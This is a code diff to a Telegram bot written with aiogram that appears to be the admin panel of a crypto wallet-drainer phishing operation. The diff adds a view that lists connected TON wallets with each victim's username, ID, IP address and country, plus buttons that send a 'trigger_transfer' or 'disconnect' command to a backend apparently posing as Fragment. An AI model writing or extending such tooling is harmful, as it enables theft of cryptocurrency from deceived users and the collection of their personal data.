@@ -2,6 +2,7 @@ import os
 import asyncio
 import json
 import uuid
+import aiohttp
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.filters import Command, StateFilter
 from aiogram.fsm.context import FSMContext
@@ -51,7 +52,8 @@ def get_admin_kb():
     return ReplyKeyboardMarkup(
         keyboard=[
             [KeyboardButton(text="🚀 Generate Link")],
-            [KeyboardButton(text="📊 View Links"), KeyboardButton(text="⚙️ Settings")]
+            [KeyboardButton(text="📊 View Links"), KeyboardButton(text="📁 Active Wallets")],
+            [KeyboardButton(text="⚙️ Settings")]
         ],
         resize_keyboard=True
     )
@@ -94,6 +96,48 @@ async def view_links(message: types.Message):
         text += f"• `{lid}`: {data['price']} TON ({data['type']})\n🔗 {link}\n\n"
 
     await message.answer(text, parse_mode="Markdown", disable_web_page_preview=True)
+
+@dp.message(F.text == "📁 Active Wallets")
+async def list_active_wallets(message: types.Message):
+    if message.from_user.id not in AUTHORIZED_ADMINS: return
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.get(f"http://localhost:8000/fragment/api/admin/wallets") as resp:
+                wallets = await resp.json()
+
+                if not wallets:
+                    await message.answer("No active wallet sessions.")
+                    return
+
+                for addr, data in wallets.items():
+                    user = data.get("user", {})
+                    user_info = f"👤 User: {user.get('username', 'N/A')} ({user.get('id', 'N/A')})"
+                    text = f"💎 *Wallet Connected*\n\n{user_info}\nAddress: `{addr}`\nIP: `{data.get('ip')}`\nCountry: `{data.get('country')}`"
+
+                    kb = InlineKeyboardMarkup(inline_keyboard=[
+                        [InlineKeyboardButton(text="🔄 Trigger Transfer", callback_data=f"admin_cmd:trigger_transfer:{addr}")],
+                        [InlineKeyboardButton(text="🔌 End Session", callback_data=f"admin_cmd:disconnect:{addr}")]
+                    ])
+                    await message.answer(text, parse_mode="Markdown", reply_markup=kb)
+    except Exception as e:
+        await message.answer(f"❌ Error fetching wallets: {e}")
+
+@dp.callback_query(F.data.startswith("admin_cmd:"))
+async def handle_admin_command(callback: types.CallbackQuery):
+    if callback.from_user.id not in AUTHORIZED_ADMINS: return
+
+    _, cmd, addr = callback.data.split(":")
+
+    try:
+        async with aiohttp.ClientSession() as session:
+            async with session.post(f"http://localhost:8000/fragment/api/admin/wallet/command", json={"address": addr, "command": cmd}) as resp:
+                if resp.status == 200:
+                    await callback.answer(f"✅ Command '{cmd}' sent!")
+                else:
+                    await callback.answer(f"❌ Failed to send command: {resp.status}")
+    except Exception as e:
+        await callback.answer(f"❌ Error: {e}")
 
 @dp.message(F.text == "⚙️ Settings")
 async def settings(message: types.Message):
